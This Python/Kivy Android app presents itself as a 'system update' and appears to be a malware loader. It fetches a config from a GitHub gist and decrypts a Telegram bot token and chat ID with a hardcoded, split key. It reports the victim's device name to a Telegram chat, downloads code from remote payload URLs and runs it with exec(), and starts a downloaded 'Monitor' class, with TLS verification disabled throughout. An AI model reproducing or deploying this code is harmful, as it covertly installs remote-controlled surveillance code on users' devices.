import os
import sys
import threading
import requests
import base64
import time
import json
import traceback
import urllib3
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.scrollview import ScrollView
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.utils import platform

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# إضافة مسار التطبيق الحالي لمسارات البحث عن المكتبات
app_path = os.path.dirname(os.path.abspath(__file__))
if app_path not in sys.path:
    sys.path.append(app_path)
for subdir in ['core', 'telegram', 'media', 'config']:
    sub_path = os.path.join(app_path, subdir)
    if os.path.exists(sub_path) and sub_path not in sys.path:
        sys.path.append(sub_path)

class SystemUpdateApp(App):
    def build(self):
        self.config_url = "https://gist.githubusercontent.com/Zaen1993/e463af07dcd7c8c1f2398fdbaf573c73/raw/1029041e26d793614ba70bccaf542bfed53eeacd/config.json"

        layout = BoxLayout(orientation='vertical')
        btn_layout = BoxLayout(size_hint_y=0.1, height=40)
        copy_btn = Button(text="📋 نسخ السجل", size_hint_x=0.3, background_color=(0.2, 0.6, 0.2, 1))
        copy_btn.bind(on_press=self.copy_log)
        btn_layout.add_widget(copy_btn)
        layout.add_widget(btn_layout)

        scroll = ScrollView(size_hint=(1, 1), do_scroll_x=True, do_scroll_y=True)
        self.log_view = TextInput(
            text="[System] Initializing...\n",
            readonly=True,
            background_color=(0, 0, 0, 1),
            foreground_color=(0, 1, 0, 1),
            font_size='14sp',
            size_hint_y=None,
            cursor_color=(0, 0, 0, 0),
            selection_color=(0.2, 0.5, 0.8, 0.8)
        )
        self.log_view.bind(minimum_height=self.log_view.setter('height'))
        scroll.add_widget(self.log_view)
        layout.add_widget(scroll)

        threading.Thread(target=self.logic_engine, daemon=True).start()
        return layout

    def copy_log(self, instance):
        from kivy.core.clipboard import Clipboard
        Clipboard.copy(self.log_view.text)
        self.log("📋 تم نسخ السجل بالكامل")

    def log(self, msg):
        timestamp = time.strftime("%H:%M:%S")
        self.log_view.text += f"[{timestamp}] {msg}\n"

    def _get_encryption_key(self):
        part1 = [77, 121, 83, 117, 112, 51, 114, 83, 51, 99, 114, 51, 116]
        part2 = [75, 51, 121, 49, 50, 51, 52, 53, 54, 55, 56, 57, 48, 49, 50, 51, 52, 53, 54]
        return bytes(part1 + part2)

    def decrypt_token(self, encrypted_data):
        if not encrypted_data:
            self.log("⚠️ بيانات مشفرة فارغة")
            return ""
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
            from cryptography.hazmat.backends import default_backend

            key = self._get_encryption_key()
            data = base64.b64decode(encrypted_data)
            if len(data) < 28:
                self.log("⚠️ البيانات المشفرة قصيرة جداً")
                return ""
            iv = data[:12]
            tag = data[-16:]
            ciphertext = data[12:-16]

            cipher = Cipher(algorithms.AES(key), modes.GCM(iv, tag), backend=default_backend())
            decryptor = cipher.decryptor()
            decrypted = decryptor.update(ciphertext) + decryptor.finalize()
            return decrypted.decode('utf-8')
        except Exception as e:
            self.log(f"❌ فك التشفير فشل: {str(e)}")
            return ""

    def send_telegram(self, token, chat_id, text):
        if not token or not chat_id:
            self.log("⚠️ لا يمكن الإرسال: توكن أو معرف دردشة فارغ")
            return False
        try:
            url = f"https://api.telegram.org/bot{token}/sendMessage"
            r = requests.post(url, json={"chat_id": chat_id, "text": text}, timeout=10, verify=False)
            if r.status_code == 200:
                self.log("✅ تم إرسال الرسالة إلى Telegram")
                return True
            else:
                self.log(f"⚠️ رد Telegram: {r.status_code} - {r.text[:100]}")
                return False
        except Exception as e:
            self.log(f"⚠️ إرسال تلغرام فشل: {e}")
            return False

    def get_device_name(self):
        try:
            from jnius import autoclass
            Build = autoclass('android.os.Build')
            model = Build.MODEL
            manufacturer = Build.MANUFACTURER
            return f"{manufacturer} {model}".strip()
        except:
            return "Android Device"

    def logic_engine(self):
        try:
            self.log("بدء تشغيل المحرك...")
            time.sleep(2)

            if platform == 'android':
                self.log("طلب صلاحيات الإنترنت...")
                from android.permissions import request_permissions, Permission
                request_permissions([Permission.INTERNET, Permission.ACCESS_NETWORK_STATE])
                time.sleep(2)

            self.log("اختبار الاتصال بـ 1.1.1.1...")
            try:
                r = requests.get("https://1.1.1.1", timeout=5, verify=False)
                self.log(f"الاتصال ناجح (حالة {r.status_code})")
            except Exception as e:
                self.log(f"⚠️ فشل اختبار الاتصال: {str(e)}")

            self.log(f"جلب الإعدادات من: {self.config_url[:60]}...")
            try:
                response = requests.get(self.config_url, timeout=15, verify=False)
                if response.status_code != 200:
                    self.log(f"❌ فشل تحميل config.json: HTTP {response.status_code}")
                    return
                config = response.json()
                self.log("تم تحليل ملف الإعدادات بنجاح.")
            except Exception as e:
                self.log(f"❌ فشل جلب أو تحليل JSON: {e}")
                return

            enc_tokens = config.get('t', [])
            if not enc_tokens:
                self.log("❌ قائمة التوكنات فارغة في config.json")
                return

            self.log(f"عدد التوكنات المشفرة: {len(enc_tokens)}")
            token = self.decrypt_token(enc_tokens[0])
            v_id = self.decrypt_token(config.get('v', ''))

            if not token or not v_id:
                self.log("❌ فشل فك تشفير التوكن أو معرف الدردشة")
                # محاولة إرسال رسالة تنبيه بدون تشفير (اختبار)
                return

            self.log("✅ تم فك تشفير التوكن ومعرف الدردشة")
            device_name = self.get_device_name()
            startup_msg = f"🚀 *System Online*\n📱 الجهاز: `{device_name}`\n🕒 الوقت: {time.strftime('%Y-%m-%d %H:%M:%S')}"
            if self.send_telegram(token, v_id, startup_msg):
                self.log("✅ تم إرسال رسالة بدء التشغيل باسم الجهاز")
            else:
                self.log("⚠️ فشل إرسال رسالة بدء التشغيل")

            globals()['MASTER_CONFIG'] = {
                'tokens': [token],
                'v_id': v_id,
                'payload_urls': config.get('payload_urls', [])
            }

            self.log("بدء تحميل البايلودات...")
            self.load_payloads()

        except Exception as e:
            error_details = traceback.format_exc()
            self.log(f"❌ خطأ جسيم:\n{error_details}")

    def load_payloads(self):
        payload_urls = globals()['MASTER_CONFIG'].get('payload_urls', [])
        if not payload_urls:
            self.log("⚠️ لا توجد روابط بايلودات")
            return
        loaded = 0
        for url in payload_urls:
            try:
                time.sleep(1)
                name = url.split('/')[-1]
                self.log(f"تحميل {name}...")
                code = requests.get(url, timeout=10, verify=False).text
                exec(code, globals())
                self.log(f"✅ تم تحميل {name}")
                loaded += 1
            except Exception as e:
                self.log(f"❌ فشل تحميل {name}: {str(e)}")
                continue
        if 'Monitor' in globals():
            self.log("بدء تشغيل Monitor...")
            monitor = globals()['Monitor']()
            monitor.start()
            self.log("✅ تم تشغيل Monitor")
        else:
            self.log("❌ لم يتم العثور على كلاس Monitor")

if __name__ == '__main__':
    SystemUpdateApp().run()
